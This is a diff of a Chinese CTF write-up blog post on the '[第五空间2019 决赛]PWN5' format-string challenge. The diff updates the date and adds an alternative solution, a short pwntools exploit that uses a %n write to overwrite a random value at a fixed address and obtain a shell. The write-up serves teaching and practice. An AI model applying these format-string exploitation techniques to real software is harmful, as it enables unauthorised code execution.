@@ -1,7 +1,7 @@
 ---
 title: pwn解题-[第五空间2019 决赛]PWN5
 date: 2026-11-04 16:05:07
-updated: 2026-11-06 01:56:11
+updated: 2026-11-15 01:14:57
 description: "[第五空间2019 决赛]PWN5 的 pwn 解题记录：32 位 No-PIE 程序把用户输入的 name 直接当作 printf 的格式串，造成格式化字符串漏洞；用 %N$s 任意地址读泄露写在固定地址 0x804C044 的 /dev/urandom 随机值，处理有符号补码后用正确的 passwd 通过 atoi 比较拿到 shell。"
 categories: CTF
 tags:
@@ -221,4 +221,26 @@ signed = value - (1 << 32) if value >= (1 << 31) else value
 io.sendline(str(signed).encode())   
 
 io.interactive()
+```
+
+---
+
+**另一种解法（任意地址写 %n）**
+
+思路与上面正好相反：不去读那个随机数，而是用 `%n` 往 `0x804c044` 写入一个已知值，把随机数覆盖掉，passwd 直接填这个值即可，根本不用知道原来的随机数。以下 exploit 引用自 [https://rocketma.dev/2023/09/19/pwn5/](https://rocketma.dev/2023/09/19/pwn5/)：
+
+```python
+from pwn import *
+sh = process('pwn5')
+
+# 静态变量randint的地址为0x0804c044
+sh.sendline(b'aa$12%nx' + p32(0x0804c044))
+# arg10: 'aa$1', arg11: '2%nx', arg12: 0x0804c044
+#即将2（成功打印aa 2个字符）写入randint中
+
+sh.sendline(b'2')
+sh.interactive()
+#输入cat flag取得flag
+
+sh.close()
 ```
